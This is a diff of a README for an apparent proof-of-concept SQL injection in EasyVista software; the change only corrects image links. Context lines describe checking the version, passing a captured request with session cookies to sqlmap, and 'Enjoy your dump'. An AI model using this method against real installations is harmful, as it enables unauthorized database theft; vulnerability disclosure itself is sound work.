@@ -15,7 +15,7 @@ To make this PoC, I just installed the sofware (`https://www.easyvista.com/`)
 
 First of all, you can check your version using this URL `xxx.com/version` you will have this kind of ouput :
 
-<img width="1280" alt="version" src="https://raw.githubusercontent.com/michmich1000/EasyVista/version.png">
+<img width="1280" alt="version" src="https://raw.githubusercontent.com/michmich1000/EasyVista/master/version.png">
 
 
 After that, you can give this request to sqlmap (`sqlmap -r theRequestFile.txt`)
@@ -37,8 +37,8 @@ Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
 Cookie: PHPSESSID=3bdb1af820b0f9246576532dd9612cf8241; uid_0282370a0aER654324b9c028a39a75=1600252617; cookie_account=1337; menu_type=global; uid_aabfafcd5a93456532254c2d1830df8fe4dd9d4=1600255497
 ```
 
-<img width="1280" alt="Boolean-based" src="https://raw.githubusercontent.com/michmich1000/EasyVista/poc.png">
+<img width="1280" alt="Boolean-based" src="https://raw.githubusercontent.com/michmich1000/EasyVista/master/poc.png">
 
-<img width="1280" alt="Boolean-based" src="https://raw.githubusercontent.com/michmich1000/EasyVista/vuln.png">
+<img width="1280" alt="Boolean-based" src="https://raw.githubusercontent.com/michmich1000/EasyVista/master/vuln.png">
 
 Enjoy your dump :) 
